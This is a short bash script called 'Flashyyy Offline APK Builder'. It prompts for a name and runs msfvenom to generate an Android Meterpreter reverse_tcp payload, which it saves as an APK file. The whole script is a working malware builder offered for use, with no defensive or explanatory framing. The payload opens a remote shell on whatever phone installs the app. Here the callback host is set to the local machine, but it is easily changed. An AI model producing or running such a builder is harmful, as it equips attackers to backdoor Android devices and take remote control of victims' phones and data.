#!/bin/bash
echo "📦 Flashyyy Offline APK Builder"
read -p "Enter payload name: " name
msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o ${name}.apk
echo "✅ APK saved as ${name}.apk"